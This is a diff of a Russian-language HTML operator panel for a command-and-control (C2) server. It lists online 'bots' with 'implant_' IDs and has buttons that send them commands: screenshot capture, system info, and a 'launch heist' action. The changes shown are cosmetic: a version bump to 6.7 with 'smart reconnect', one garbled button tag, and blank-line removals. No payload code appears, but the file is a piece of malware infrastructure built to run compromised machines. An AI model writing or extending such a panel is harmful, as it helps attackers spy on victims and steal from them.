@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<!-- Файл: index.html (Финальная, ревизированная версия) -->
+<!-- Файл: index.html (Версия 6.7 - Умный реконнект) -->
 <html lang="ru">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C2 Коммандный Мостик (ФИНАЛ)</title>
+    <title>C2 Коммандный Мостик v6.7</title>
     <style>
         :root {
             --bg-color: #1a1a1c;
@@ -304,7 +304,7 @@
 <body>
     <div class="container">
         <header>
-            <h1>Коммандный Мостик (ФИНАЛ)</h1></header>
+            <h1>Коммандный Мостик v6.7</h1></header>
         <main class="app-layout">
             <aside class="sidebar">
                 <h2>Боты в сети</h2>
@@ -318,8 +318,8 @@
                         <h2>Команды для (<span id="selected-bot-name"></span>)</h2>
                         <div class="grid-controls">
                             <button class="btn-action" onclick="sendCommand({action: 'screenshot'})">Скриншот</button>
-                            <button class="btn-action" onclick="sendCommand({action: 'sysinfo'})">Инфо о системе</button>
-                            <button class="btn-danger" onclick="sendCommand({action: 'heist'})">ЗАПУСТИТЬ HEIST</button>
+                            <button class="btn-action" onclick="sendCommand({action: 'sysinfo'})">Инфо о системе&lt;/button>
+                                <button class="btn-danger" onclick="sendCommand({action: 'heist'})">ЗАПУСТИТЬ HEIST</button>
                         </div>
                     </section>
                     <section>
@@ -559,7 +559,6 @@
             }));
             log(`Команда '${payload.action}' -> ${selectedBotId.replace('implant_', '')}`, 'command');
         }
-
         const debounce = (func, delay) => {
             let timeout;
             return (...args) => {
@@ -584,7 +583,6 @@
                 url
             });
         }
-
         ui.logHeader.addEventListener('click', () => ui.logContainer.classList.toggle('collapsed'));
         ui.clearLogBtn.addEventListener('click', (e) => {
             e.stopPropagation();
